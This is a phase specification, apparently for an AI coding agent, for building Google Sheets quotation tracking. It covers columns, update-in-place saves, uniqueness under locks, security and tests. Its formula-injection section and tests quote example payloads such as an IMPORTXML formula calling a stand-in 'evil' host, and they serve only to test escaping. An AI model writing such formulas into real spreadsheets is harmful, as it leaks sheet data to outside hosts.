# Phase 11 — Google Sheets

---

# Objective

Implement Google Sheets as the V1 quotation tracking system: a `Quotations` sheet whose columns A–H are exactly those defined in PRD §31, plus the system columns this architecture requires; a row written automatically on every successful Drive save; guaranteed quotation-number uniqueness; status tracking; and update-in-place when an existing quotation is re-saved.

---

# Mandatory Instructions

- Before making changes, inspect the relevant existing files.
- Use the existing project architecture where appropriate.
- Reuse existing components and utilities where possible.
- Do not unnecessarily duplicate functionality.
- Do not create dummy production data.
- Do not create fake clients, quotations, users, prices, signatures, quotation numbers, Google Drive URLs, or Google Sheets records.
- Use strict TypeScript.
- Avoid unnecessary `any`.
- Run TypeScript checks.
- Run lint.
- Run the project build.
- Run all relevant tests.
- Fix all errors before completing the phase.
- Implement ONLY this phase.
- Do NOT implement functionality belonging to later phases.
- Do NOT proceed to the next phase.
- Stop after completing this phase.

---

# Prerequisites

- Phase 10 complete and green: Drive folders and URLs exist, and the save handler has a marked integration point for the Sheets write.

---

# Files to Inspect

- `quotation-implementation-plan/IMPLEMENTATION_PLAN.md` — **§17 (Sheets architecture)**, §17.2 (the exact column list), §17.4 (uniqueness), §19.5 (formula injection), §23.2 (partial failure), §7.4 (`Counters`, already built in Phase 03).
- `PRD/quotation-prd.md` — **§31 (tracking, the required columns and statuses)**, §32 (the Phase 2 dashboard — explicitly not now), §30 step 13, §37 (error handling), §33 (security).
- `google-apps-script/src/sheets/*` — the repositories already built in Phases 02, 03, 05, and 06. Reuse the shared sheet-access helpers; do not write a fourth variant.
- `google-apps-script/src/quotation/handlers.ts` — extend the save handler at its integration point.
- `google-apps-script/src/drive/*` — the URLs to record.

---

# Implementation Scope

**In scope**

1. The `Quotations` sheet: creation if absent, headers, formats, and the Status data validation.
2. Appending a row on a first successful save; **updating** the existing row on a re-save.
3. Quotation-number uniqueness enforcement.
4. `quotation.list`, `quotation.get`, and `quotation.updateStatus` reading and writing the tracking sheet.
5. Formula-injection escaping on every written value.
6. The Drive Folder hyperlink column.
7. Server-computed monetary values only.
8. Frontend: the Quotations list backed by the sheet, with search, status filter, and a status-change control.
9. Retry semantics when the Sheets write fails after a successful Drive upload.

**Out of scope** — later phases

The Phase 2 dashboard (PRD §32 says explicitly not now). The broader security review (12). Full test suite (13). Deployment and production spreadsheet setup (14). Do not modify numbering, Drive, the document model, or the generators.

---

# Required Changes

## `Quotations` sheet columns

Columns A–H are exactly PRD §31, in the PRD's order. Columns I–Q are system columns required by this phase's scope and by the retry/idempotency design; they are additive, may be hidden, and carry no business meaning of their own.

| Col | Header | Source |
|---|---|---|
| A | Quotation No. | canonical `SFC/RUH/QTN/YYYY/NNN` — **unique key** |
| B | Date | quotation date, `DD-MM-YYYY` (matching the document) |
| C | Client Name | |
| D | Company Name | |
| E | Quotation For | |
| F | Total Amount | **server-computed** grand total, SAR, 2 dp |
| G | Status | data validation `Pending` \| `Approved` \| `Rejected`, default `Pending` |
| H | Drive Folder | `HYPERLINK` to the quotation folder |
| I | PDF URL | Drive `webViewLink` |
| J | DOCX URL | Drive `webViewLink` |
| K | Subtotal | server-computed |
| L | VAT Amount | server-computed |
| M | Authorized Person | snapshot name |
| N | Created By | user email |
| O | Created At | ISO 8601 UTC |
| P | Updated At | ISO 8601 UTC |
| Q | Draft ID | idempotency key enabling update-in-place |

Do not add business fields beyond these. Do not omit any of A–H.

## Write semantics

- **First save** — append a row with Status `Pending`.
- **Re-save** — locate the row by `Draft ID` (falling back to `Quotation No.`) and **update it**. Never append a second row for the same quotation.
- **Status is preserved on re-save.** Staff edit Status directly in the Sheet (PRD §31 and §7 make the Sheet the V1 tracking mechanism); a document re-save must never reset an `Approved` quotation to `Pending`.
- `Created At` is written once; `Updated At` moves on every write.
- All monetary values are server-computed, never taken from the client payload.

## Uniqueness

Three layers, per `IMPLEMENTATION_PLAN.md` §17.4: the `Counters` sheet is the only issuer; a pre-append scan of column A rejects an already-present number with `DUPLICATE_QUOTATION_NUMBER`; and a conditional-format rule highlights any duplicate introduced by manual editing. Perform the scan and the append inside a script lock so two concurrent saves cannot both pass the check.

## Formula injection (mandatory)

Any value beginning with `=`, `+`, `-`, or `@` is prefixed with `'` before being written. A client named `=IMPORTXML("http://evil","//x")` must land in the cell as inert text. Values are written with `setValue`/`setValues`, never assembled into formula strings — the single exception is the Drive Folder hyperlink, built from a **validated** `https://drive.google.com/` URL with an escaped label.

---

# Expected Files / Components

```
google-apps-script/src/sheets/{quotations-sheet,sheet-bootstrap,cell-escaping,
                               sheet-formatting}.ts
google-apps-script/src/quotation/handlers.ts             (extended: save writes the row)
google-apps-script/src/config/properties.ts              (TRACKING_SPREADSHEET_ID required)

src/services/google-sheets/sheets-service.ts
src/pages/quotations/index.tsx                            (backed by the tracking sheet)
src/components/quotation/{QuotationTable,StatusSelect,QuotationFilters,
                          SheetsSyncWarning}.tsx
src/hooks/useQuotationTracking.ts

*.test.ts alongside each new module
```

---

# Architecture Requirements

- Sheets access happens **only** in Apps Script. The frontend never calls the Sheets API and never holds a Google credential.
- Reuse the existing sheet-access helpers from Phases 02–06. One way to read a sheet, one way to write one.
- The spreadsheet id comes from Script Properties; never hard-coded.
- Bootstrap is idempotent: creating the sheet, its headers, its formats, and its validation must be safe to run repeatedly and must never destroy existing rows.
- Batch reads and writes (`getValues`/`setValues`) rather than per-cell calls — Apps Script per-call overhead is the dominant cost and a per-cell loop will hit the execution limit.
- Do not add Supabase, PostgreSQL, or any database. The Sheet is the V1 record system.

---

# Files That Must NOT Be Changed

- `PRD/quotation-prd.md`
- `reference/*`
- `quotation-implementation-plan/*`
- `google-apps-script/src/quotation-number/*` — including the `Counters` sheet logic.
- `google-apps-script/src/auth/*`
- `google-apps-script/src/drive/*` — Drive is finished; consume its URLs.
- `src/services/{pdf,docx,document}/*`
- `shared/{numbering,money,totals}.ts`

---

# Data Requirements

- **The production spreadsheet starts with zero quotation rows** (PRD §34). Only real saves create rows.
- No demo rows, no example clients, no example amounts, no fake Drive URLs, no placeholder statuses.
- Bootstrap creates headers and formatting only — never a sample row.
- Development and testing use a **separate development spreadsheet** configured through the development deployment.
- Monetary values are server-computed; never accept a client-supplied total.
- The date format in the sheet is `DD-MM-YYYY`, matching the generated document.
- Test fixtures fake `SpreadsheetApp` entirely; no test touches a real spreadsheet.

---

# Security Requirements

- Every Sheets action requires a valid session token verified before any sheet access.
- **Formula-injection escaping on every written value** — this is the highest-risk item in the phase.
- The Drive Folder hyperlink is built only from a URL matching `^https://drive\.google\.com/`; anything else is written as inert text.
- Cap every string's length before writing.
- `quotation.updateStatus` accepts only the three allowed values, and only from an authenticated user.
- The `Users` and `AuditLog` sheets stay protected and hidden; this phase must not widen their access.
- Never return raw sheet ranges, row indices, or the spreadsheet id to the client.
- Audit every row write and status change with the actor, the quotation number, and the `requestId`.
- Do not log full row payloads.

---

# Validation Requirements

Before writing:

- The quotation number is present and matches `^SFC\/RUH\/QTN\/(\d{4})\/(\d{3,})$`.
- The number is not already present in column A for a different `Draft ID`.
- The Drive folder URL and both file URLs are valid Drive URLs.
- The status is one of the three allowed values.
- All monetary values are integers in minor units before formatting.
- `TRACKING_SPREADSHEET_ID` is configured, otherwise `CONFIG_MISSING`.

After writing:

- Read the row back and confirm the quotation number, the total, and the status match what was intended.
- Confirm exactly one row exists for the quotation number.

---

# Testing Requirements

With a faked `SpreadsheetApp`:

**Structure**

- Bootstrap creates the sheet with all 17 headers in the specified order.
- Bootstrap is idempotent and never destroys existing rows.
- Status data validation offers exactly the three values.

**Writes**

- A first save appends exactly one row with Status `Pending`.
- A re-save updates the existing row and does **not** append.
- A re-save preserves an `Approved` status.
- `Created At` is written once; `Updated At` moves.
- Monetary values are server-computed and formatted to 2 dp.
- The Drive Folder cell is a working hyperlink to the folder.
- PDF URL and DOCX URL are recorded.

**Uniqueness**

- Appending a number already present for a different quotation is rejected with `DUPLICATE_QUOTATION_NUMBER`.
- Two concurrent saves of different quotations both succeed with distinct numbers.
- Two concurrent saves of the **same** `draftId` produce exactly one row.

**Injection**

- A client name of `=IMPORTXML("http://x","//y")` is written as `'=IMPORTXML…` and is inert.
- `+`, `-`, and `@` leading values are likewise escaped.
- A non-Drive URL in the folder field is written as text, not as a hyperlink.

**Reads and status**

- The list returns rows with correct typing; search and status filter work.
- A status change persists and is audited.
- A status changed manually in the Sheet is reflected on the next read.

**Errors** — a Sheets failure after a successful Drive upload returns a warning with a retry; the retry updates rather than duplicating.

---

# TypeScript Requirements

- Strict mode; no `any`; explicit return types on exported functions.
- A typed row model with a column-index mapping derived from the header constant, so adding a column cannot silently shift the reads.
- `QuotationStatus` is a union; the sheet value is narrowed on read and an unexpected value is a typed error, not a cast.
- `npx tsc --noEmit` clean for both projects.

---

# Build Requirements

- `npm run build` and `npm run gas:build` succeed.
- No frontend Sheets dependency — no `googleapis`, no `gapi`.
- Measure and record the per-save Sheets execution time to confirm headroom against the Apps Script limits.

---

# Lint Requirements

- `npm run lint` clean, zero warnings.
- No hard-coded spreadsheet ids or sheet names outside the constants module.
- No `console.log` of row data.

---

# Error Handling

Per PRD §37:

- A Sheets write failure **after** a successful Drive upload shows a warning — the documents are safe in Drive but tracking is incomplete — with a retry that updates rather than duplicates.
- Codes: `SHEETS_WRITE_FAILED`, `DUPLICATE_QUOTATION_NUMBER`, `VALIDATION_FAILED`, `CONFIG_MISSING`, `RATE_LIMITED`.
- A lock timeout during the uniqueness check is retryable with backoff.
- A partially written row is never left behind: write the full row in one `setValues` call so it cannot half-succeed.
- Every user-facing failure carries the `requestId`.

---

# Completion Criteria

- [ ] The `Quotations` sheet exists with columns A–H exactly as PRD §31 defines, plus the documented system columns.
- [ ] A successful Drive save automatically writes a tracking row.
- [ ] The quotation number in the Sheet exactly matches the number in the documents.
- [ ] Numbers are unique; duplicates are rejected, including under concurrency.
- [ ] A re-save updates the existing row and preserves the status.
- [ ] Status supports `Pending` / `Approved` / `Rejected`, defaulting to `Pending`.
- [ ] The Drive Folder column is a working link; the PDF and DOCX URLs are recorded.
- [ ] Formula-injection escaping is applied to every written value.
- [ ] Monetary values are server-computed.
- [ ] The production spreadsheet contains zero dummy rows.
- [ ] `npx tsc --noEmit`, `npm run lint`, `npm run build`, `npm run gas:build`, `npm test` all clean.
- [ ] Committed to `claude/quotation-app-architecture-ycbwpa`.

---

# Stop Conditions

**Stop after Google Sheets tracking is green and committed.**

Do not build the dashboard — PRD §32 states explicitly that it is not required for V1. Do not add analytics, charts, or month-wise aggregation sheets. Do not modify numbering, Drive, or the generators. Do not create rows in a production spreadsheet.

Stop and ask the user if:

- The company wants additional business columns beyond PRD §31 — the system columns here are the minimum this architecture needs, and anything further is a scope change.
- The company wants status changes to flow only from the app rather than being editable in the Sheet — PRD §31 and §7 currently make the Sheet the V1 tracking mechanism.
- The tracking spreadsheet must be split per year for volume reasons — that changes the read paths and needs agreement first.
